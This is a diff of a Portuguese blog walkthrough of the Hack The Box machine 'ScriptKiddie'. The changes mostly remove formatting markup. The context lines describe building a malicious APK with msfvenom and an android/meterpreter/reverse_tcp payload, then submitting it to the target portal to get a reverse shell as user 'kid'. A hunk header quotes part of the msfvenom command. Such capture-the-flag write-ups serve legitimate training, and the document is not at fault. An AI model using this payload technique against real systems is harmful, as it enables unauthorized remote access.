@@ -16,12 +16,12 @@ title: 'Walktrough: HTB ScriptKiddie'
 
 Olá pessoal!
 
-A máquina desta semana será **ScriptKiddie**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), criada por [0xdf](https://app.hackthebox.eu/users/4935).<!--more-->
+A máquina desta semana será **ScriptKiddie**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), criada por [0xdf](https://app.hackthebox.eu/users/4935). [more]
 
 :information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
-{: .notice--info}
 
-![HTB ScriptKiddie](https://i.imgur.com/Igno8wu.png){: .align-center}
+
+![HTB ScriptKiddie](https://i.imgur.com/Igno8wu.png)
 
 ## Enumeração
 
@@ -110,11 +110,11 @@ Do: msfvenom -x /tmp/tmpt7qr4ner/evil.apk -p android/meterpreter/reverse_tcp LHO
 
 Após gerado o arquivo APK contendo o payload, executado um request no portal com os dados sugeridos no final da execução do script anterior, apontando para o LHOST 127.0.0.1 e selecionando o tipo de payload android, que deverá ser traduzido para o payload `android/meterpreter/reverse_tcp`.
 
-![Submiting the evil payload](https://i.imgur.com/Nvcj4BA.png){: .align-center}
+![Submiting the evil payload](https://i.imgur.com/Nvcj4BA.png)
 
 Após clicar no botão **Generate**, um shell reverso foi retornado no listener inicializado previamente conforme especificado durante a criação do payload.
 
-![reverse shell returned](https://i.imgur.com/llt85mf.png){: .align-center}
+![reverse shell returned](https://i.imgur.com/llt85mf.png)
 
 Nesta mesma sessão obtida, com as credenciais em que o aplicativo se encontrava em execução, no caso o usuário `kid`, foi possível obter a flag de usuário.
 
